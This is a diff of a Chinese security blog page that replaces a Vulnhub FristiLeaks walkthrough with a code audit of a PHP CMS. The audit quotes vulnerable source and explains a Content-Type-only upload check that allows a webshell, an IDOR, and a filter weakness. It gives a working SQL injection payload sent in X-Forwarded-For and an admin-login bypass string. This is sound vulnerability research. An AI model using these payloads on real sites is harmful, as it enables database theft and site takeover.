@@ -108,36 +108,28 @@
 
 
 
-  <meta name="description" content="A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..">
-<meta name="keywords" content="Web,Linux">
+  <meta name="description" content="挺简单一套CMS，找SQL注入的时候脑残了">
+<meta name="keywords" content="Web,PHP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Vulnhub FristiLeaks">
-<meta property="og:url" content="http://yoursite.com/2018/10/02/Vulnhub-FristiLeaks/index.html">
+<meta property="og:title" content="BlueCMS 代码审计">
+<meta property="og:url" content="http://yoursite.com/2019/03/30/bees/index.html">
 <meta property="og:site_name" content="Noel&#39;s Blog">
-<meta property="og:description" content="A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..">
+<meta property="og:description" content="挺简单一套CMS，找SQL注入的时候脑残了">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/Vulnhub-FristiLeaks/nmap.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/Vulnhub-FristiLeaks/80.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/Vulnhub-FristiLeaks/calm.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/Vulnhub-FristiLeaks/login.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/Vulnhub-FristiLeaks/tip1.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/Vulnhub-FristiLeaks/tip2.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/Vulnhub-FristiLeaks/pwd1.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/Vulnhub-FristiLeaks/upload.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/Vulnhub-FristiLeaks/upshell.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/Vulnhub-FristiLeaks/shell.png">
-<meta property="og:updated_time" content="2018-10-05T05:08:51.459Z">
+<meta property="og:image" content="http://yoursite.com/2019/03/30/bees/upload1.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/30/bees/sql1.png">
+<meta property="og:updated_time" content="2019-03-30T14:46:33.963Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Vulnhub FristiLeaks">
-<meta name="twitter:description" content="A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..">
-<meta name="twitter:image" content="http://yoursite.com/2018/10/02/Vulnhub-FristiLeaks/nmap.png">
+<meta name="twitter:title" content="BlueCMS 代码审计">
+<meta name="twitter:description" content="挺简单一套CMS，找SQL注入的时候脑残了">
+<meta name="twitter:image" content="http://yoursite.com/2019/03/30/bees/upload1.png">
 
 
 
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/02/Vulnhub-FristiLeaks/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/03/30/bees/"/>
 
 
 
@@ -147,7 +139,7 @@
   };
 </script>
 
-  <title>Vulnhub FristiLeaks | Noel's Blog</title>
+  <title>BlueCMS 代码审计 | Noel's Blog</title>
   
 
 
@@ -308,7 +300,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/02/Vulnhub-FristiLeaks/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/30/bees/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Noel">
@@ -325,7 +317,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Vulnhub FristiLeaks
+          <h1 class="post-title" itemprop="name headline">BlueCMS 代码审计
               
             
           </h1>
@@ -350,24 +342,12 @@
                 
               
 
-              <time title="创建时间：2018-10-02 00:00:00" itemprop="dateCreated datePublished" datetime="2018-10-02T00:00:00+08:00">2018-10-02</time>
+              <time title="创建时间：2019-03-30 00:00:00 / 修改时间：22:46:33" itemprop="dateCreated datePublished" datetime="2019-03-30T00:00:00+08:00">2019-03-30</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2018-10-05 13:08:51" itemprop="dateModified" datetime="2018-10-05T13:08:51+08:00">2018-10-05</time>
               
             
           </span>
@@ -384,7 +364,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Challenge/" itemprop="url" rel="index"><span itemprop="name">Challenge</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>
 
                 
                 
@@ -426,34 +406,77 @@
       
 
       
-        <p>A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..<br><a id="more"></a></p>
-<h2 id="0x01-开始前的准备"><a href="#0x01-开始前的准备" class="headerlink" title="0x01 开始前的准备"></a>0x01 开始前的准备</h2><h3 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h3><p><a href="https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrent" target="_blank" rel="noopener">https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrent</a><br><a href="https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova" target="_blank" rel="noopener">https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova</a></p>
-<h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>VMware users will need to manually edit the VM’s MAC address to: 08:00:27:A5:A6:76<br>也就是把VMware的MAC地址调为08:00:27:A5:A6:76，之后开启虚拟机即可</p>
-<h2 id="0x02-扫描"><a href="#0x02-扫描" class="headerlink" title="0x02 扫描"></a>0x02 扫描</h2><p>首先使用Nmap进行扫描</p>
-<p><img src="/2018/10/02/Vulnhub-FristiLeaks/nmap.png" alt=""></p>
-<p>只有80端口开启，nmap扫描下80端口</p>
-<p><img src="/2018/10/02/Vulnhub-FristiLeaks/80.png" alt=""></p>
-<p>可以看到robots文件存在，并有三个目录存在</p>
-<p>访问192.168.1.5，除了一张图片，基本上没有什么了</p>
-<p><img src="/2018/10/02/Vulnhub-FristiLeaks/calm.png" alt=""></p>
-<p>robots.txt里的三个页面打开后是同一张图片，看来是毫无用处了，用御剑扫了下目录发现images文件夹,基本没用</p>
-<h2 id="0x03-获得Shell"><a href="#0x03-获得Shell" class="headerlink" title="0x03 获得Shell"></a>0x03 获得Shell</h2><p>最后回到主页的图片上来，fristi，题目好像也有这个，于是试了下fristi</p>
-<p><img src="/2018/10/02/Vulnhub-FristiLeaks/login.png" alt=""></p>
-<p>弱口令失败，看下源代码想找找有没有什么东西</p>
-<p><img src="/2018/10/02/Vulnhub-FristiLeaks/tip1.png" alt=""></p>
-<p><img src="/2018/10/02/Vulnhub-FristiLeaks/tip2.png" alt=""></p>
-<p>Great</p>
-<p>先将base64解码，出现PNG字样，用base64转图片</p>
-<p><img src="/2018/10/02/Vulnhub-FristiLeaks/pwd1.png" alt=""></p>
-<p>得到一串字符，尝试登陆：</p>
-<p>正好第一处tip中有个名字，尝试登陆</p>
-<p>进入上传页面</p>
-<p><img src="/2018/10/02/Vulnhub-FristiLeaks/upload.png" alt=""></p>
-<p>在namp扫描时发现服务器为Apache Linux所以尝试下多重后缀名</p>
-<p><img src="/2018/10/02/Vulnhub-FristiLeaks/upshell.png" alt=""></p>
-<p>上传成功，用菜刀连接</p>
-<p><img src="/2018/10/02/Vulnhub-FristiLeaks/shell.png" alt=""></p>
-<h2 id="0x04-提升权限"><a href="#0x04-提升权限" class="headerlink" title="0x04 提升权限"></a>0x04 提升权限</h2><p>正在骑马赶来的路上……</p>
+        <p><font color="green">挺简单一套CMS，找SQL注入的时候脑残了</font><br><a id="more"></a></p>
+<h3 id="后台直接上传WebShell"><a href="#后台直接上传WebShell" class="headerlink" title="后台直接上传WebShell"></a>后台直接上传WebShell</h3><p>漏洞位于/admin/admin_pic_upload.php</p>
+<p>直接看上传相关的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_uploaded_file($v))&#123;</span><br><span class="line">		$pic_info[<span class="string">'tmp_name'</span>]=$v;</span><br><span class="line">		$pic_info[<span class="string">'size'</span>]=$_FILES[<span class="string">'up'</span>][<span class="string">'size'</span>][$k];</span><br><span class="line">		$pic_info[<span class="string">'type'</span>]=$_FILES[<span class="string">'up'</span>][<span class="string">'type'</span>][$k];</span><br><span class="line">		$pic_info[<span class="string">'name'</span>]=$_FILES[<span class="string">'up'</span>][<span class="string">'name'</span>][$k];</span><br><span class="line">		$pic_name_alt=<span class="keyword">empty</span>($is_alt)?<span class="string">''</span>:$pic_alt[$k];</span><br><span class="line">		$is_up_size = $_sys[<span class="string">'upload_size'</span>]*<span class="number">1000</span>*<span class="number">1000</span>;</span><br><span class="line">		$value_arr=up_img($pic_info,$is_up_size,<span class="keyword">array</span>(<span class="string">'image/gif'</span>,<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/jpg'</span>,<span class="string">'image/bmp'</span>,<span class="string">'image/pjpeg'</span>,<span class="string">'image/x-png'</span>),$up_is_thumb,$up_thumb_width,$up_thumb_height,$logo=<span class="number">1</span>,$pic_name_alt);</span><br><span class="line">		<span class="comment">//处理上传后的图片信息</span></span><br><span class="line">		$pic_name=$value_arr[<span class="string">'up_pic_name'</span>];<span class="comment">//图片名称空</span></span><br><span class="line">		$pic_ext=$value_arr[<span class="string">'up_pic_ext'</span>];<span class="comment">//图片扩展名</span></span><br><span class="line">		$pic_title = $pic_alt[$k];<span class="comment">//图片描述</span></span><br><span class="line">		$pic_size = $value_arr[<span class="string">'up_pic_size'</span>];<span class="comment">//图片大小</span></span><br><span class="line">		$pic_path = $value_arr[<span class="string">'up_pic_path'</span>];<span class="comment">//上传路径</span></span><br><span class="line">		$pic_time = $value_arr[<span class="string">'up_pic_time'</span>];<span class="comment">//上传时间</span></span><br><span class="line">		$pic_thumb = iconv(<span class="string">'GBK'</span>,<span class="string">'UTF-8'</span>,$value_arr[<span class="string">'thumb'</span>]);<span class="comment">//缩略图</span></span><br><span class="line">		$cate = <span class="keyword">empty</span>($pic_cate)?<span class="number">1</span>:$pic_cate;<span class="comment">//图片栏目</span></span><br><span class="line">		<span class="comment">//入库</span></span><br><span class="line">$sql=<span class="string">"insert into "</span>.DB_PRE.<span class="string">"uppics (pic_name,pic_ext,pic_alt,pic_size,pic_path,pic_time,pic_thumb,pic_cate) values ('"</span>.$pic_name.<span class="string">"','"</span>.$pic_ext.<span class="string">"','"</span>.$pic_title.<span class="string">"','"</span>.$pic_size.<span class="string">"','"</span>.$pic_path.<span class="string">"','"</span>.$pic_time.<span class="string">"','"</span>.$pic_thumb.<span class="string">"',"</span>.$cate.<span class="string">")"</span>;</span><br><span class="line">$mysql-&gt;query($sql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>up_img函数用来判断文件类型，原函数为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">up_img($file,$size,$type,$thumb=<span class="number">0</span>,$thumb_width=<span class="string">''</span>,$thumb_height=<span class="string">''</span>,$logo=<span class="number">1</span>,$pic_alt=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+<p>这里的type很明显是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">'image/gif'</span>,<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/jpg'</span>,<span class="string">'image/bmp'</span>,<span class="string">'image/pjpeg'</span>,<span class="string">'image/x-png'</span>)</span><br></pre></td></tr></table></figure>
+<p>这一串，也就是说这是一个只检测Content-Type的函数</p>
+<p><img src="/2019/03/30/bees/upload1.png" alt=""></p>
+<p>轻松搞定</p>
+<h3 id="用户咨询鸡肋越权"><a href="#用户咨询鸡肋越权" class="headerlink" title="用户咨询鸡肋越权"></a>用户咨询鸡肋越权</h3><p>/member/member.php</p>
+<p>看修改咨询处代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">	$id=intval(fl_value($_GET[<span class="string">'id'</span>]));</span><br><span class="line">	$member_id=intval(fl_value($_GET[<span class="string">'member_id'</span>]));</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($id))&#123;<span class="keyword">die</span>(<span class="string">"&lt;script type=\"text/javascript\"&gt;alert('&#123;$language['msg_info10']&#125;');history.go(-1);&lt;/script&gt;"</span>);&#125;</span><br><span class="line">	$sql=<span class="string">"select*from "</span>.DB_PRE.<span class="string">"ask where id=&#123;$id&#125; and member=&#123;$member_id&#125;"</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>只要知道id以及咨询的id即可得知别人的咨询，当然也可以通过遍历，并没什么卵用</p>
+<h3 id="产品购买处存在SQL注入"><a href="#产品购买处存在SQL注入" class="headerlink" title="产品购买处存在SQL注入"></a>产品购买处存在SQL注入</h3><p>/mx_form/order_save.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$addtime=time();</span><br><span class="line">$ip=fl_value(get_ip());</span><br><span class="line">$ip=fl_html($ip);</span><br><span class="line">$member_id=<span class="keyword">empty</span>($_SESSION[<span class="string">'id'</span>])?<span class="number">0</span>:$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">$arc_id=<span class="keyword">empty</span>($f_id)?<span class="number">0</span>:intval($_POST[<span class="string">'f_id'</span>]);</span><br><span class="line">$sql=<span class="string">"insert into "</span>.DB_PRE.<span class="string">"formlist (form_id,form_time,form_ip,member_id,arc_id) values (&#123;$form_id&#125;,&#123;$addtime&#125;,'&#123;$ip&#125;','&#123;$member_id&#125;','&#123;$arc_id&#125;')"</span>;</span><br><span class="line">$mysql-&gt;query($sql);</span><br></pre></td></tr></table></figure>
+<p>IP经过fl_value以及fl_html处理</p>
+<p>先来看下fl_value</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($str))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="keyword">return</span> preg_replace(<span class="string">'/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i'</span>,<span class="string">''</span>,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看出有许多问题，首先是将一些敏感字符替换为空，替换为空，替换为空！！！</p>
+<p>问题似乎很简单了</p>
+<p>再来看下fl_html</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> htmlspecialchars($str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里使用了htmlspecialchars进行转义，那么这又是何方神圣呢</p>
+<p>看下官方解释</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">字符</th>
+<th style="text-align:left">替换后</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><em>&amp;</em> (&amp; 符号)</td>
+<td style="text-align:left"><em>&amp;</em></td>
+</tr>
+<tr>
+<td style="text-align:left"><em>“</em> (双引号)</td>
+<td style="text-align:left"><em>&quot;</em>，除非设置了 <strong>ENT_NOQUOTES</strong></td>
+</tr>
+<tr>
+<td style="text-align:left"><em>‘</em> (单引号)</td>
+<td style="text-align:left">设置了 <strong>ENT_QUOTES</strong> 后， <em>&#039;</em> (如果是 <strong>ENT_HTML401</strong>) ，或者 <em>&apos;</em> (如果是 <strong>ENT_XML1</strong>、 <strong>ENT_XHTML</strong> 或 <strong>ENT_HTML5</strong>)。</td>
+</tr>
+<tr>
+<td style="text-align:left"><em>&lt;</em> (小于)</td>
+<td style="text-align:left"><em>&lt;</em></td>
+</tr>
+<tr>
+<td style="text-align:left"><em>&gt;</em> (大于)</td>
+<td style="text-align:left"><em>&gt;</em></td>
+</tr>
+</tbody>
+</table>
+<p>其作用是将一些敏感字符替换掉，那么注意了，这里之说当指定了ENT_QUOTES后单引号才会被替换！！！</p>
+<p>看来这两个函数对我们并没有什么影响了呢</p>
+<p>在购买处填写好消息，然后提交</p>
+<p>增加X-Forwarded-For</p>
+<p><code>X-Forwarded-For: lalala&#39;,&#39;0&#39;,&#39;&#39; or updatexml(1,concat(0x7e,user(),0x7e),1))#</code></p>
+<p><img src="/2019/03/30/bees/sql1.png" alt=""></p>
+<p>该CMS基本上都是采用这两个函数进行过滤，也就是说，这个CMS到处是注入！！</p>
+<p>后台处：</p>
+<p>账号:’ unselection selselectect 1,2,md5(3),4,0#</p>
+<p>密码:3</p>
+<p>可以直接登陆后台</p>
+<p>进入后台利用上传处漏洞可GETSHELL</p>
+<blockquote>
+<p>我愿千金散尽只为赠你火树银花；我愿点亮夜空只为你灿烂一笑。</p>
+</blockquote>
 
       
     </div>
@@ -476,7 +499,7 @@
           
             <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
           
-            <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
+            <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
           
         </div>
       
@@ -489,8 +512,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/10/02/墨者学院-redis未授权访问/" rel="next" title="redis未授权访问">
-                <i class="fa fa-chevron-left"></i> redis未授权访问
+              <a href="/2019/03/21/subdomin/" rel="next" title="Subdomain Collect Plan">
+                <i class="fa fa-chevron-left"></i> Subdomain Collect Plan
               </a>
             
           </div>
@@ -498,10 +521,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/03/finecms免费版漏洞分析/" rel="prev" title="finecms免费版漏洞分析">
-                finecms免费版漏洞分析 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -703,7 +722,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-开始前的准备"><span class="nav-number">1.</span> <span class="nav-text">0x01 开始前的准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境下载"><span class="nav-number">1.1.</span> <span class="nav-text">环境下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配置环境"><span class="nav-number">1.2.</span> <span class="nav-text">配置环境</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-扫描"><span class="nav-number">2.</span> <span class="nav-text">0x02 扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-获得Shell"><span class="nav-number">3.</span> <span class="nav-text">0x03 获得Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-提升权限"><span class="nav-number">4.</span> <span class="nav-text">0x04 提升权限</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#后台直接上传WebShell"><span class="nav-number">1.</span> <span class="nav-text">后台直接上传WebShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用户咨询鸡肋越权"><span class="nav-number">2.</span> <span class="nav-text">用户咨询鸡肋越权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#产品购买处存在SQL注入"><span class="nav-number">3.</span> <span class="nav-text">产品购买处存在SQL注入</span></a></li></ol></div>
             
 
           </div>
